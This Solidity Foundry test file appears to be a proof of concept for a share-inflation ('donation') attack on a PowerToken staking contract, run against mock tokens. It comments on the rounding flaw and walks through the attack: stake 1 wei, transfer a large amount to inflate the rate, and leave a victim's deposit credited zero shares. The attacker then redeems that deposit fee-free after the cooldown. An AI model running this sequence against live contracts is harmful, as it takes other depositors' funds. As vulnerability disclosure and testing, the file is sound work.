// SPDX-License-Identifier: BSD-3-Clause
pragma solidity 0.8.26;

import "../TestCommons.sol";
import "../PowerTokensTestsSystem.sol";
import "../../contracts/interfaces/IPowerTokenStakeService.sol";
import "../../contracts/interfaces/IPowerTokenLens.sol";
import "../../contracts/interfaces/IPowerTokenInternal.sol";
import "../../contracts/interfaces/IPowerToken.sol";
import "../../contracts/mocks/tokens/MockToken.sol";

/// @notice The PowerToken exchange rate is derived from a raw ERC-20 `balanceOf`
///         with no virtual offset and no dead shares:
///
///            rate = iporToken.balanceOf(powerToken) * 1e18 / _baseTotalSupply
///                                                    (PowerTokenInternal._calculateInternalExchangeRate)
///
///         Deposits are credited at that rate:
///
///            baseAmount = amount * 1e18 / rate      (PowerToken.addGovernanceTokenInternal)
///
///         `baseAmount` is what the depositor actually owns. A depositor cannot
///         see or bound it: `stakeGovernanceTokenToPowerToken(beneficiary, amount)`
///         takes no `minBaseOut` / expected-rate / deadline argument, and
///         `PowerTokenRouter` is a pass-through that adds none. So anyone who
///         inflates the contract's raw ipOR balance inflates the rate, and every
///         subsequent depositor is credited a near-zero, rounding-to-zero base
///         amount while their tokens leave their wallet and land in the contract.
///
///         The attacker needs to own essentially all of `_baseTotalSupply` to keep
///         this working, which costs 1 wei: stake 1 wei, then donate the rest.
///         Victim deposits round to 0 base and are fully attributable to the
///         attacker, who extracts them fee-free after the cooldown via
///         `redeemInternal` (the `removeGovernanceTokenWithFeeInternal` path charges
///         50%, `redeemInternal` charges nothing).
contract PwTokenDonationAttackTest is TestCommons {
    PowerTokensTestsSystem internal _system;
    address internal _router;
    address internal _powerToken;
    address internal _iporToken;
    uint256 internal _coolDown;

    address internal _attacker;
    address internal _victim;

    uint256 internal constant UNIT = 1e18;

    function setUp() external {
        _system = new PowerTokensTestsSystem();
        _router = _system.router();
        _powerToken = _system.powerToken();
        _iporToken = _system.iporToken();
        _coolDown = _system.COOL_DOWN_IN_SECONDS();

        _attacker = _getUserAddress(1);
        _victim = _getUserAddress(2);

        _system.makeAllApprovals(_attacker);
        _system.makeAllApprovals(_victim);
        _system.transferIporToken(_attacker, 10_000_000 * UNIT);
        _system.transferIporToken(_victim, 10_000 * UNIT);
    }

    // ---------------------------------------------------------------------
    // Step 1: prove the rate is donation-sensitive in the first place.
    // ---------------------------------------------------------------------

    function test_donationAloneInflatesExchangeRate() external {
        uint256 rateBefore = IPowerTokenInternal(_powerToken).calculateExchangeRate();

        // Nobody has staked yet, so _baseTotalSupply == 0 and the rate short-circuits.
        assertEq(rateBefore, 1e18, "empty pool starts at 1:1");

        // Attacker becomes the sole staker with 1 wei.
        vm.prank(_attacker);
        IPowerTokenStakeService(_router).stakeGovernanceTokenToPowerToken(_attacker, 1);

        uint256 rateAfterStake = IPowerTokenInternal(_powerToken).calculateExchangeRate();
        assertEq(rateAfterStake, 1e18, "1 wei in, 1 wei of base, still 1:1");

        // A bare ERC-20 transfer - no protocol function involved at all.
        vm.prank(_attacker);
        MockToken(_iporToken).transfer(_powerToken, 1_000_000 * UNIT);

        uint256 rateAfterDonation = IPowerTokenInternal(_powerToken).calculateExchangeRate();

        assertGt(
            rateAfterDonation,
            rateAfterStake * 1_000_000,
            "a plain transfer moved the exchange rate by >1e6x"
        );
    }

    // ---------------------------------------------------------------------
    // Step 2: a normal depositor is credited ~nothing and loses their tokens.
    // ---------------------------------------------------------------------

    function test_victimDepositIsCreditedZeroBase() external {
        _donateAndInflate(1_000_000 * UNIT);

        uint256 victimTokensBefore = MockToken(_iporToken).balanceOf(_victim);
        uint256 baseSupplyBefore = IPowerTokenInternal(_powerToken).totalSupplyBase();
        uint256 contractBalanceBefore = MockToken(_iporToken).balanceOf(_powerToken);

        uint256 victimStake = 1_000 * UNIT;

        vm.prank(_victim);
        IPowerTokenStakeService(_router).stakeGovernanceTokenToPowerToken(_victim, victimStake);

        uint256 baseSupplyAfter = IPowerTokenInternal(_powerToken).totalSupplyBase();
        uint256 contractBalanceAfter = MockToken(_iporToken).balanceOf(_powerToken);

        // The victim's ipOR left their wallet and is now in the contract...
        assertEq(
            MockToken(_iporToken).balanceOf(_victim),
            victimTokensBefore - victimStake,
            "victim tokens should have left the wallet"
        );
        assertEq(
            contractBalanceAfter - contractBalanceBefore,
            victimStake,
            "victim tokens should be in the contract"
        );

        // ...and the contract now shows a balance that does not reflect the
        // deposit, because the base ledger absorbed none of it.
        assertEq(
            baseSupplyAfter - baseSupplyBefore,
            0,
            "victim was credited zero base for a non-zero deposit"
        );
        assertEq(
            IPowerToken(_powerToken).balanceOf(_victim),
            0,
            "victim holds zero pwToken after staking"
        );
    }

    // ---------------------------------------------------------------------
    // Step 3: the attacker takes the victim's stake, fee-free, via cooldown+redeem.
    // ---------------------------------------------------------------------

    function test_attackerRedeemsVictimStakeFeeFree() external {
        uint256 donation = 1_000_000 * UNIT;
        _donateAndInflate(donation);

        uint256 victimStake = 1_000 * UNIT;

        vm.prank(_victim);
        IPowerTokenStakeService(_router).stakeGovernanceTokenToPowerToken(_victim, victimStake);

        // The victim's pwToken balance is 0, so this is not a rounding quibble:
        // the entire deposit is unowned.
        assertEq(
            IPowerToken(_powerToken).balanceOf(_victim),
            0,
            "victim owns nothing after staking"
        );

        // The attacker's 1 wei of base is now worth the whole contract balance.
        uint256 attackerPwToken = IPowerToken(_powerToken).balanceOf(_attacker);
        uint256 contractBalance = MockToken(_iporToken).balanceOf(_powerToken);
        assertGe(
            attackerPwToken,
            contractBalance,
            "attacker's pwToken should cover the entire contract balance"
        );

        // Attacker's net position before extraction: donated `donation`, staked 1 wei.
        // The immediate unstake path charges 50%, so use the cooldown/redeem path,
        // which charges nothing. Cooldown requires available pwToken >= amount.
        vm.prank(_attacker);
        IPowerTokenStakeService(_router).pwTokenCooldown(attackerPwToken);

        vm.warp(block.timestamp + _coolDown + 1);

        uint256 attackerTokensBefore = MockToken(_iporToken).balanceOf(_attacker);

        vm.prank(_attacker);
        IPowerTokenStakeService(_router).redeemPwToken(_attacker);

        uint256 attackerTokensAfter = MockToken(_iporToken).balanceOf(_attacker);
        uint256 profit = attackerTokensAfter - attackerTokensBefore;

        // Donation was 1,000,000; attacker put 1 wei in and took the 1,000 the
        // victim deposited on top of getting their own donation back intact.
        assertGe(profit, victimStake, "attacker should profit at least the victim's stake");
        assertGe(
            attackerTokensAfter,
            attackerTokensBefore + donation,
            "attacker should get the donation back too"
        );
    }

    // ---------------------------------------------------------------------
    // Control: without the donation, staking behaves as the tests expect.
    // ---------------------------------------------------------------------

    function test_control_stakeIsCreditedOneToOne() external {
        uint256 baseSupplyBefore = IPowerTokenInternal(_powerToken).totalSupplyBase();

        vm.prank(_victim);
        IPowerTokenStakeService(_router).stakeGovernanceTokenToPowerToken(_victim, 1_000 * UNIT);

        assertEq(
            IPowerTokenInternal(_powerToken).totalSupplyBase() - baseSupplyBefore,
            1_000 * UNIT,
            "undisturbed deposit should be credited 1:1"
        );
        assertEq(
            IPowerToken(_powerToken).balanceOf(_victim),
            1_000 * UNIT,
            "victim should hold their stake"
        );
    }

    // ---------------------------------------------------------------------
    // helper
    // ---------------------------------------------------------------------

    /// Stake 1 wei so `_baseTotalSupply` becomes non-zero, then donate the rest as
    /// a bare ERC-20 transfer. After this the attacker owns 100% of the base
    /// ledger and the rate is inflated by roughly `donation`.
    function _donateAndInflate(uint256 donation) private {
        vm.prank(_attacker);
        IPowerTokenStakeService(_router).stakeGovernanceTokenToPowerToken(_attacker, 1);

        vm.prank(_attacker);
        MockToken(_iporToken).transfer(_powerToken, donation);

        assertEq(
            IPowerTokenInternal(_powerToken).totalSupplyBase(),
            1,
            "attacker should own the entire base ledger"
        );
    }
}
